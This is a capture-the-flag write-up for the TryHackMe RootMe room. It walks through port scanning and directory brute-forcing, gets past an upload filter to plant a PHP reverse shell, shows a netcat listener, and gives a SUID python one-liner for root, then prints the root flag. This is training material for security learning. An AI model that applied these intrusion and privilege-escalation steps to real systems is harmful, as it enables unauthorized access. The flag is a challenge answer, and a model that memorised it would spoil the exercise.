# CTF Write-Up: RootMe (TryHackMe)

## Challenge Overview

* Platform: TryHackMe
* Room: RootMe
* Category: Web Exploitation & Privilege Escalation
* Objective: Gain user and root access to retrieve both flags

---

## Reconnaissance

The first step was to scan the target machine to identify open ports and services.

### Nmap Scan Results

* Open Ports: 2
* Port 22: SSH
* Port 80: HTTP
<img width="975" height="264" alt="image" src="https://github.com/user-attachments/assets/70654739-93ab-4544-93e3-5933ddafe07a" />

### Service Enumeration

* Apache Version: 2.4.41

Further enumeration was performed using directory brute-forcing tools like `gobuster`, which revealed a hidden directory:

```bash
/panel/
```

### Hidden Directory Discovery

<img width="975" height="416" alt="image" src="https://github.com/user-attachments/assets/ad716470-4b3a-4b26-9a77-353a44979aef" />


---

## Gaining Initial Access

The `/panel/` directory contained a file upload functionality, which could potentially be exploited.

### Upload Attempt

A PHP reverse shell from PentestMonkey was downloaded and modified with the attacker's IP address.

Initial attempts:

* `shell.php` → Upload failed
* `shell.php3` → Uploaded but no execution
* `shell.php5` → Successfully uploaded and executed

### Reverse Shell Setup

A Netcat listener was started on the attacker machine:

```bash
nc -lvnp <port>
```

Once the uploaded file was executed via the browser, a reverse shell was obtained.

### Reverse Shell

<img width="975" height="251" alt="image" src="https://github.com/user-attachments/assets/96c3a464-7118-4b3e-b5c9-e0138d390c53" />

<img width="975" height="354" alt="image" src="https://github.com/user-attachments/assets/899922d7-ee69-4dbf-bd0a-198657cc7bbe" />

---

## User Flag

To locate the user flag, the following command was used:

```bash
find / -type f -name user.txt 2> /dev/null
```

After locating the file, it was read to obtain the user flag.

### User Flag


---

## Privilege Escalation

### Finding SUID Files

To identify files with SUID permissions:

```bash
find / -user root -perm /4000 2> /dev/null
```

A suspicious file was found:

```bash
/usr/bin/python
```

### SUID Enumeration

![SUID File](screenshots/suid.png)

---

## Exploiting SUID with GTFOBins

Using **GTFOBins**, it was discovered that Python can be used to escalate privileges.

The following command was executed:

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

This spawned a shell with root privileges.

To confirm:

```bash
whoami
```

Output:

```bash
root
```

---

## Root Flag

To locate and read the root flag:

```bash
find / -type f -name root.txt 2> /dev/null
cat /root/root.txt
```

### Root Flag

THM{pr1v1l3g3_3sc4l4t10n}


---

## Key Takeaways

* Directory brute-forcing can reveal hidden attack surfaces
* File upload functionality is a common entry point for exploitation
* Bypassing file extension filters is a practical technique
* SUID binaries can lead to privilege escalation if misconfigured
* GTFOBins is an essential resource for privilege escalation

---

## Tools Used

* Nmap
* Gobuster
* Netcat
* GTFOBins
* Linux commands
